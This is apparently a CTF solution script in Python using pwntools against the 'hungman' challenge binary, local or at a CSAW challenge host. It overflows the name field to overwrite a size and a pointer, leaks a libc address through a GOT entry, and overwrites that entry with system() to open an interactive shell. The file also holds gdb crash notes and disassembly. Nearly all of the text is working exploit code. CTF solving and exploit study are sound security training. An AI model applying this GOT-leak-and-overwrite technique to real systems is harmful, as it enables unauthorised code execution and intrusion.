#!/usr/bin/env python
from pwn import *

p = process('./hungman/hungman') if '--live' not in sys.argv else remote('pwn.chal.csaw.io', 8003)

print(p.recvregex("What's your name?"))
p.sendline("A"*(0xf8/2))

# with high-enough probability, every char will occur at least once for length 0xf8/2
print(p.recvuntil(['_'*(0xf8/2)]))
for c in range(ord('a'), ord('z')+1):
    p.sendline(chr(c))

print(p.recvregex('High score! change name?'))
p.sendline('y')

#gdb.attach(p)
#p.send(cyclic(0xf8))
'''
Program received signal SIGSEGV, Segmentation fault.
0x00007f6a60a45dcc in _IO_vfprintf_internal (s=s@entry=0x7ffffb442700, 
    format=<optimized out>, format@entry=0x401175 "Highest player: %s", 
    ap=ap@entry=0x7ffffb442868) at vfprintf.c:1642
1642    vfprintf.c: No such file or directory.
(gdb) i r rdi
rdi            0x6261616f6261616e   7089054419477684590
'''
'''
>>> cyclic(0xf8).find(struct.pack("<Q", 0x6261616f6261616e))
152
>>> hex(152)
'0x98'
'''

#gdb.attach(p)

# score is at name[0x90:0x94]
# size is at name[0x94:0x98]
# &name is at name[0x98:0xa0]
newname = cyclic(0x90)
#newname = cyclic(0xf8/2)
newscore = 9002
newsize = 0x256
free_plt = 0x602018
free_plt_delta = 1 if '--live' not in sys.argv else 0 # free starts in a null locally
memset_plt = 0x602050
strchr_plt = 0x602038
#p.send(newname+struct.pack("<IIQ", newscore, newsize, free_plt+free_plt_delta))
#p.send(newname+struct.pack("<IIQ", newscore, newsize, memset_plt))
p.send(newname+struct.pack("<IIQ", newscore, newsize, strchr_plt))

r = 'Highest player: (.*) score: %d' % (newscore,)
has_leak = p.recvregex(r)
print('has_leak: %r' % (has_leak,))

pad = lambda x: x if len(x) == 8 else x+'\0'*(8-len(x))
#free_leak = struct.unpack("<Q", pad('\x00'*free_plt_delta+re.findall(r, has_leak)[0]))[0]
#print('free_leak: %x' % (free_leak,))
#memset_leak = struct.unpack("<Q", pad(re.findall(r, has_leak)[0]))[0]
#print('memset_leak: %x' % (memset_leak,))
strchr_leak = struct.unpack("<Q", pad(re.findall(r, has_leak)[0]))[0]
print('strchr_leak: %x' % (strchr_leak,))

libc_dict = dict()
if '--live' not in sys.argv:
    # my libc (for local testing)
    # 0x00000000001816c8 : adc al, 0 ; add byte ptr [rax], al ; pop rsp ; ret
    '''
[0x001816c8]> pd 4
            0x001816c8      1400           adcb $0, %al
            0x001816ca      0000           addb %al, (%rax)
            0x001816cc      5c             popq %rsp
            0x001816cd      c3             retq
    '''
    libc_dict['free'] = 0x0007c600
    libc_dict['system'] = 0x00041490
    libc_dict['/bin/sh'] = 0x00163708
    libc_dict['memset'] = 0x00085620
    libc_dict['poprsp'] = 0x001816cc
    libc_dict['memcpy'] = 0x0008a790
    libc_dict['strchr'] = 0x0007ff70
    libc_dict['__strchr_sse2'] = 0x00165809
    libc_dict['strchr_ish'] = 524192
else:
    # the provided libc
    libc_dict['free'] = 0x00083a70
    libc_dict['memset'] = 0x0008e780
    libc_dict['strchr_ish'] = 0x00089080
    libc_dict['system'] = 0x00045380

'''
0x004010e3: popq %rdi; retq;
'''

pack = lambda x: struct.pack("<Q", x)

#libc_base = free_leak - libc_dict['free']
libc_base = strchr_leak - libc_dict['strchr_ish']
print('libc_base: %x' % (libc_base,))

#poprsp = pack(libc_base + libc_dict['poprsp'])
poprsi = pack(0x004010e3)
system = pack(libc_base + libc_dict['system'])
#binsh = pack(libc_base + libc_dict['/bin/sh'])
#ropchain = poprsp+pack(0x4142434445464748) + poprsi+binsh + system
#print(repr(ropchain))

'''
[0x0004137b]> pd 10
            0x0004137b      488d3d862312.  leaq 0x122386(%rip), %rdi   ; 0x163708 ; str._bin_sh ; "/bin/sh" @ 0x163708
            0x00041382      488d742430     leaq 0x30(%rsp), %rsi       ; 0x30 ; section_end..gnu.warning.fdetach ; section_end..gnu.warning.fdetach
            0x00041387      c7052f613600.  movl $0, 0x36612f(%rip)     ; [0x3a74c0:4]=0
            0x00041391      c70529613600.  movl $0, 0x366129(%rip)     ; [0x3a74c4:4]=0
            0x0004139b      488b10         movq (%rax), %rdx
            0x0004139e      e86d8f0700     callq sym.execve
'''
'''
0x000baccc      488d3d358a0a.  leaq 0xa8a35(%rip), %rdi    ; 0x163708 ; str._bin_sh ; "/bin/sh" @ 0x163708
0x000bacd3      e9ccfeffff     jmp 0xbaba4
-----
; JMP XREF from 0x000bacd3 (sym.execvpe)
0x000baba4      488b75b8       movq -0x48(%rbp), %rsi
0x000baba8      4c89e2         movq %r12, %rdx
0x000babab      e860f7ffff     callq sym.execve
'''

print(p.recvuntil(["Continue?"]))
p.sendline('y')

print(p.recvregex('__*'))
for c in range(ord('a'), ord('z')+1):
    p.sendline(chr(c))

print(p.recvuntil(['High score! change name?']))
p.sendline('y')
p.send(system)
#p.send(pack(libc_base+0x000baccc))
#p.send(pack(0x00400a0d))

p.interactive()
